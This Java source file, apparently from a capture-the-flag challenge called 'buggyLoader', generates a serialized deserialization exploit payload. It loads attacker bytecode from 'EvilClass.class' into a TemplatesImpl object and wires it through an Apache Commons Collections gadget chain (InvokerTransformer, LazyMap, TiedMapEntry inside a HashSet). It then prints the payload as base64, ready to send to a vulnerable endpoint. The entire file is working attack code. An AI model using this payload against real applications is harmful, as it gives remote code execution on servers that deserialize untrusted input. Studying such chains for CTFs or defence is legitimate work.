package com.yxxx.buggyLoader;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.BASE64Encoder;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import java.io.ObjectOutputStream;
public class Temp {
    public static class StaticBlock { }

    public static void main(String[] args) throws Exception{
        System.out.println(getExp());
    }
    public static String getExp() throws Exception {
        //plz change path of EvilClass.class
        byte[] bytecodes = Files.readAllBytes(new File("EvilClass.class").toPath());
        
        TemplatesImpl templatesimpl = new TemplatesImpl();
        Field fieldByteCodes = templatesimpl.getClass().getDeclaredField("_bytecodes");
        fieldByteCodes.setAccessible(true);
        fieldByteCodes.set(templatesimpl, new byte[][]{bytecodes});
        Field fieldName = templatesimpl.getClass().getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templatesimpl, "name");
        Field fieldTfactory = templatesimpl.getClass().getDeclaredField("_tfactory");
        fieldTfactory.setAccessible(true);
        fieldTfactory.set(templatesimpl, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());

        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templatesimpl);

        HashSet hashSet = new HashSet(1);
        hashSet.add("c014");
        Field fmap = hashSet.getClass().getDeclaredField("map");
        fmap.setAccessible(true);
        HashMap innimpl = (HashMap) fmap.get(hashSet);
        Field ftable = hashMap.getClass().getDeclaredField("table");
        ftable.setAccessible(true);
        Object[] nodes =(Object[])ftable.get(innimpl);
        Object node = nodes[1];
        Field fnode = node.getClass().getDeclaredField("key");
        fnode.setAccessible(true);
        fnode.set(node, tiedMapEntry);

        Field f = transformer.getClass().getDeclaredField("iMethodName");
        f.setAccessible(true);
        f.set(transformer, "newTransformer");


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);

        oos.writeObject(hashSet);
        byte[] exp = baos.toByteArray();
        BASE64Encoder base64 = new BASE64Encoder();
        oos.close();
        String p = base64.encode(exp);
        //System.out.println(p);
        p = p.replace("\n", "");
        return p;
    }
}

